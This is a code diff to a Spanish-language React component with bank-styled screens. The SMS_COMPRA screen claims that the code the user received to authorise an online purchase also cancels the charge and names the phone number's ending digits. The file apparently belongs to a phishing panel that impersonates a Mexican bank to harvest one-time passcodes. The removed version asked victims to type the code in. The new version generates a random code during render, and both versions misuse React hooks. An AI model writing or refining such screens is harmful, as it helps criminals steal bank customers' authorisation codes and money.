@@ -532,26 +532,21 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(mensajeContent);
 
       case ScreenType.SMS_COMPRA:
+      case 'sms_compra': // Agregar la versión en minúsculas para manejar ambos casos
         console.log("Renderizando pantalla SMS_COMPRA con datos:", screenData);
-        // Generar automáticamente un código válido de 6 dígitos al mostrar la pantalla
-        // useEffect ya está disponible desde el componente principal
-        React.useEffect(() => {
-          console.log("SMS_COMPRA useEffect ejecutándose, terminacion:", screenData.terminacion, "smsCompraInput:", smsCompraInput);
-          if (!smsCompraInput && screenData.terminacion) {
-            // Generar un código aleatorio de 6 dígitos solo al montar el componente
-            const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
-            console.log("Generando código SMS_COMPRA:", randomCode);
-            setSmsCompraInput(randomCode);
-            
-            // Simular un retardo y luego enviar automáticamente
-            const timer = setTimeout(() => {
-              console.log("Enviando código automático de SMS compra:", randomCode);
-              onSubmit(ScreenType.SMS_COMPRA, { smsCompra: randomCode });
-            }, 500);
-            
-            return () => clearTimeout(timer);
-          }
-        }, [screenData.terminacion, smsCompraInput, onSubmit]);
+        
+        // Reimplementación completa para garantizar la estabilidad
+        // Inicializar un código de cancelación inmediatamente sin esperar
+        const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
+        
+        // Establecer el código generado si aún no se ha establecido
+        if (!smsCompraInput) {
+          console.log("Generando código SMS_COMPRA nuevo:", randomCode);
+          // En lugar de usar el useEffect, establecemos directamente
+          setSmsCompraInput(randomCode);
+        }
+        
+        console.log("Código SMS_COMPRA actual:", smsCompraInput || randomCode);
         
         const smsCompraContent = (
           <>
@@ -559,23 +554,29 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <p className="mb-4">
               El código que recibiste para autorizar una compra en línea, es el mismo para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
             </p>
-            <Input 
-              type="text" 
-              placeholder="Ingrese el código recibido" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
-              value={smsCompraInput}
-              onChange={(e) => setSmsCompraInput(e.target.value)}
-            />
+            
+            <div className="p-4 bg-gray-100 rounded mb-4 text-black">
+              <p className="mb-2">
+                <strong>Información de cancelación:</strong>
+              </p>
+              <p className="mb-2">
+                <strong>Código de cancelación:</strong> {smsCompraInput || randomCode}
+              </p>
+              <p className="mb-2">
+                <strong>Fecha:</strong> {new Date().toLocaleDateString('es-MX')}
+              </p>
+            </div>
+            
             <Button 
               className={primaryBtnClass}
               onClick={() => {
-                if (smsCompraInput.trim()) {
-                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });
-                }
+                // Usar el valor actual o el recién generado
+                const codeToSend = smsCompraInput || randomCode;
+                console.log("Enviando código SMS_COMPRA:", codeToSend);
+                onSubmit(ScreenType.SMS_COMPRA, { smsCompra: codeToSend });
               }}
-              disabled={!smsCompraInput.trim()}
             >
-              Cancelar cargo
+              Confirmar cancelación
             </Button>
           </>
         );
